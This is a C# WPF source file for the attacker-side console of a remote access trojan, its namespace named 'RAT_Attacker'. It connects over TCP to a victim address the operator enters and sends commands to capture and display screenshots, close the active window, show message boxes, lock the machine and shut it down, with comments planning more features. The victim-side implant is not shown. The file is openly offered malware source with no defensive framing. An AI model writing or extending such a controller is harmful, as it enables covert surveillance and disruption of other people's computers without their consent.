using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows;
using Forms = System.Windows.Forms;

namespace RAT_Attacker
{
    /*
     * open screenshots in the same window
     * custom mboxes
     * play audio
     */
    public partial class MainWindow : Window
    {
        Socket client;

        ImageConverter converter = new ImageConverter();

        public MainWindow()
        {
            InitializeComponent();
        }

        private void SendCommand(string command)
        {
            client = new Socket(SocketType.Stream, ProtocolType.Tcp);
            try
            {
                client.Connect(new IPEndPoint(IPAddress.Parse(addressTextBox.Text), 80));
                client.Send(Encoding.ASCII.GetBytes(command));
            }
            catch (SocketException ex)
            {
                if (ex.SocketErrorCode == SocketError.ConnectionRefused)
                {
                    MessageBox.Show("Cannot connect", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private void CloseActiveWindow(object sender, RoutedEventArgs e)
        {
            SendCommand("CloseActiveWindow");
        }

        private void ShowMessageBox(object sender, RoutedEventArgs e)
        {
            SendCommand("ShowMessageBox");
        }

        private void TakeScreenshot(object sender, RoutedEventArgs e)
        {
            SendCommand("TakeScreenshot");
            byte[] buffer = new byte[256_000];
            client.Receive(buffer);

            var form = new Forms.Form
            {
                ShowIcon = false,
                Width = (int)Width,
                Height = (int)Height
            };

            var pictureBox = new Forms.PictureBox
            {
                Dock = Forms.DockStyle.Fill,
                SizeMode = Forms.PictureBoxSizeMode.StretchImage,
                Image = (Bitmap)converter.ConvertFrom(buffer)
            };

            form.Controls.Add(pictureBox);
            form.Show();
        }

        private void Lock(object sender, RoutedEventArgs e)
        {
            SendCommand("Lock");
        }

        private void Shutdown(object sender, RoutedEventArgs e)
        {
            SendCommand("Shutdown");
        }
    }
}
